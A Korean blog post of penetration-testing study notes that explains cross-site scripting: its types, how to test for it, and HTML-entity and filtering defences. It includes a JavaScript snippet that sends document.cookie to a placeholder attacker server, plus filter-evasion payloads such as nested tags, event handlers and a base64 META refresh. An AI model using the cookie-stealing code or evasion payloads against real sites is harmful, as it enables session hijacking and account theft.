---
layout: post
comments: true
sitemap:
    changefreq:
    priority:

title: "[WEB HACKING] XSS란?"
excerpt: "모의해킹 취업반 스터디 7기 9 ~ 11주차"

date: 2024-12-11
last_modified_at: 2024-12-26

categories: [SECURITY]
tags: [TIL, WEB, SECURITY]
---

# 목차
* [1. 개요](#1-개요)
* [2. 공격 방식](#2-xss-공격-방식)
* [3. 공격 유형](#3-xss-공격-유형)
* [4. 공격 구문 예시](#4-공격-구문-예시)
* [5. 공격 순서](#5-공격-순서)
* [참고](#참고)

# XSS(Cross Site Scripting)란?
## 1. 개요
**XSS(Cross Site Scripting)** 공격은 <mark>웹 사이트에 악성 스크립트를 삽입하는 공격</mark>이다.  
보통 클라이언트 측에서 악성 [스크립트](#footnote_1)<sup>1</sup>를 삽입해 다른 이용자의 브라우저에서 실행되게 만든다.  
<a name='footnote_1'>[1] 클라이언트 스크립트: 이용자 브라우저에서 실행되는 스크립트로 HTML, CSS, JS 등이 있다.</a>  
~~검증할 때는 공격자, 피해자 역할로 직접 확인해보면 된다.~~

## 2. XSS 공격 방식
XSS 공격 방식으로는 <mark>Cookie Sniffing</mark>, <mark>스크립트 암호화 및 우회</mark>, <mark>악성 스크립트 유포</mark>, <mark>Key Logger</mark>, <mark>Mouse Sniffer</mark>, <mark>거짓 정보추가</mark> 등이 있다.

### 2.1. Cookie Sniffing
```js
let cookieData = document.cookie;
let img = new Image(); // img 태그 생성
img.src = "http://[공격자서버]/?cookie=" + cookieData; // src의 공격자 서버에 접속하면서 cookie data를 남긴다.
```
JS 코드가 img 태그를 만든다  
img 태그는 만들어지기 위해 src의 URL을 접속한다  
담겨있는 URL은 공격자 서버에서 GET 방식의 request를 남긴다  

* 공격자 서버
    * VPS
    * [Requestbin](https://public.requestbin.com/r/)

## 3. XSS 공격 유형
1. Reflected XSS
1. Stored XSS
1. DOM Based SCC

### 3.1. Reflected XSS: 서버의 에코 기능을 이용하자
공격자가 악성 스크립트를 클라이언트에게 직접 전달해 공격하는 방식이다.  

<mark>사용자에게 입력 받은 값을 서버에서 되돌려주는 곳에서 발생</mark>한다.  
e.g. 에러 메시지, 검색 결과 창, 아이디 중복 체크 등  
-> 항상 스크립트를 삽입하는 곳과 출력하는 곳의 위치가 같다.  

주로 이메일, 메신저 등에 포함된 <mark>URL에 스크립트를 포함시켜 공격</mark>한다.  
URL이 길면 클라이언트가 의심을 가질 수 있기 때문에 Shorten URL (URL 단축)을 이용해 짧은 URL로 만들어 공격하기도 한다.  

서버에 스크립트를 저장하지 않기 때문에 서버에서 이뤄지는 필터링을 피할 수 있고 흔적이 상대적으로 남지 않는다.  
URL에 스크립트를 포함시켜 대상에게 전달하기 때문에 타겟팅 공격이 가능하다.

### 3.2. Stored XSS: 악성 스크립트를 서버에 저장하자
<mark>웹 서버에 악성 스크립트를 저장</mark>하는 공격 방법이다.  
공격자는 악성 스크립트가 포함된 글을 작성해 사용자가 접근할 수 있는 페이지에 업로드한다.  
이후 <mark>사용자가 해당 게시글을 요청하면 서버에 저장된 악성 스크립트가 사용자 측에서 동작</mark>한다.  

데이터가 저장되고, 출력(화면에 나오는 곳)되는 곳에서 발생한다.  
e.g. 데이터베이스, 댓글창, 방문 로그, 회원가입 페이지, 게시판 글 작성 페이지 등  

서버에 스크립트를 저장하기 때문에 흔적이 남는다.  
사용자가 악성 스크립트가 포함된 글을 접근하면 동작하기 때문에 공격 범위가 광범위하다.

### 3.3. DOM Based XSS -> 브라우저에서 조립되는 script!
피해자의 브라우저가 HTML 페이지를 분석해 **[DOM](#footnote_2)**<sup>2</sup>을 생성할 때 <mark>악성 스크립트가 DOM의 일부로 구성되어 생성</mark>되는 공격이다.  
-> JS로 JS tag를 만들 수 있다.  
-> 키워드: `document.write`, `innerHTML`  

서버의 응답 내에서 악성 스크립트가 포함되지 않지만 브라우저의 응답 페이지에 정상적인 스크립트가 실행되면서 악성 스크립트가 추가되어 실행된다.  

e.g.  
```html
<script>
    function trackSearch(query) {
        document.write(
            "<img src='/resources/images/tracker.gif?searchTerms=" + query + "'>");
    }

    let query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
        trackSearch(query);
    }
</script>
```

~~response의 JS 코드를 분석해야 한다.~~  
<a name='footnote_2'>[2] <b>DOM(Document Object Model, 문서 객체 모델)</b>: 웹페이지를 여는 즉시 생성되어 사용자가 서버와 상호 작용하지 않고도 페이지의 모든 콘텐츠에 엑세스할 수 있도록 돕는 프로그래밍 인터페이스이다.</a>

## 4. 공격 구문 예시
**POC(Proof of Concept)**: 클라이언트측에서 코드가 실행되었음을 알려주는 코드  
e.g.
* `<script>alert(1);<script>`
* `<script>prompt(1);<script>`
* `<script>confirm(1);<script>`
* `<script>console.log(1);<script>`

---

1. 기본 구문  
`<script>alert(1)</script>`

1. `script` 태그 공백으로 필터링  
    1. `<ScRiPt>alert(1)</ScRiPt>`  
    -> 대소문자를 섞는다  
    1. `<scr<script>ipt>alert(1)</scr</script>ipt>`  
    -> script 태그가 필터링되면 갈라져있던 script 태그가 결합되면서 구문 실행  
1. script 태그 다른 문자로 바뀌는 필터링  
Event Handler 이용: onload, onclick, onmouseover, onfocus 등  
    1. `onmouseover` 이용  
    `<a onmouseover="alert(1)">`  
    -> onmouseover 이벤트를 통해 공격 실행  
    1. `onerror` 이용  
    `<img src=# onerror="alert(1)">`  
    -> 고의적으로 src 주소를 지정 후 onerror 이벤트를 통해 공격 실행  
    1. `onload` 이용  
    `<body onload=alert(1)>`  
    1. `a` tag 이용  
    `<a href="javascript:alert(1)">test</a>`  
    1. `input` tag 이용  
    `<input type="text" autofocus onfocus="alert(1)">`  
1. XSS Using Script Via Encoded URI Schemes  
`<IMG SRC=j&#X41vascript:alert(1)>`  
-> 필터링을 피하기 위해서 인코딩된 글자를 사용한다.  
1. XSS Using Code Encoding  
`<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg">`  
-> `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg` = `alert(1)`을 base64로 인코딩했다  
-> META 태그 안에 base64로 인코딩한 스크립트를 집어넣어 `alert()`의 원형을 완전히 숨길 수 있다.  
1. 흔히 사용하지 않는 태그 이용  
`<ruby onmouseover="alert(1)"></ruby>`  
-> 해당 태그가 필터에서 누락된 경우 공격 실행  

1. 글자 수 제한일 때
`<script src = "외부 js"></script>`로 외부 script를 챙겨올 수 있다

## 5. 공격 순서
### 5.1. Reflected XSS
1. 파라미터 데이터가 서버 응답에 삽입되어 오는가?  
burp, param check, response에 같은 값 있나?  
1. 특수문자 체크  
-> `<'">`
1. change request method가 가능하냐?
    1. get method 이용
1. 스크립트 입력하기  
-> `<script>___<script>`
1. 링크 전달

### 5.2. Stored XSS
1. 작성한 데이터가 화면에 응답되는 거 확인  
-> 저장하는 곳과 출력되는 곳이 다를 수 있음
2. 특수문자 체크  
-> `<'">`
3. 스크립트 입력하기  
-> `<script>___<script>`

## 6. 대응방안
1. HTML 특수문자를 <mark>HTML Entity</mark> 표현 방법으로 치환하기
![Some HTML Entities](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-19-2.png?raw=true)
-> 적용하지 못하는 곳: HTML Editor 등
1. 필터링
    * 블랙 리스트 기반 필터링: 특정 단어를 못 들어오게 하는 것  
    -> 우회가 될 가능성이 존재한다.
    * 화이트 리스트 기반 필터링: 특정 단어만 들어오게 하는 것

* HTML Editor 같은 곳에서
1. 파라미터에서 HTML 특수문자들을 전부 HTML Entity로 치환
1. 허용해줄 tag를 식별하고 그 tag를 다시 살린다. (화이트 리스트 기반)
1. 살려준 tag 내에 악의적인 Event Handler 필터링. (블랙 리스트 기반)

# 참고
* [Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
* [XSS란?](https://tibetsandfox.tistory.com/5)
* [크로스 사이트 스크립팅의 정의 및 공격 유형](https://nordvpn.com/ko/blog/xss-attack/)
* [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
* [DOM-based XSS 1](https://portswigger.net/web-security/cross-site-scripting/dom-based)
* [DOM-based XSS 2](https://owasp.org/www-community/attacks/DOM_Based_XSS)
* [해시뱅(#!)에 대해서...](https://blog.outsider.ne.kr/698)
* [DOM XSS in jQuery anchor href attribute sink using location.search source](https://medium.com/@marduk.i.am/dom-xss-in-jquery-anchor-href-attribute-sink-using-location-search-source-b1000b4b16b3)
* [XSS(크로스 사이트 스크립트)란? 공격 유형부터 보안대책까지!](https://www.skshieldus.com/blog-security/security-trend-idx-06)
* [[알아두면 유용한] 넷상의 쓰레기통들 - pastebin과 requestbin](https://domdom.tistory.com/38)
* [Requestbin Development](https://glasses96.github.io/posts/24/)
* [Request Capture like requestbin PHP](https://stackoverflow.com/questions/42685368/request-capture-like-requestbin-php)
* [PHP-Micro-RequestBin](https://github.com/vinhch/PHP-Micro-RequestBin)
* [HTML Entities](https://www.w3schools.com/html/html_entities.asp)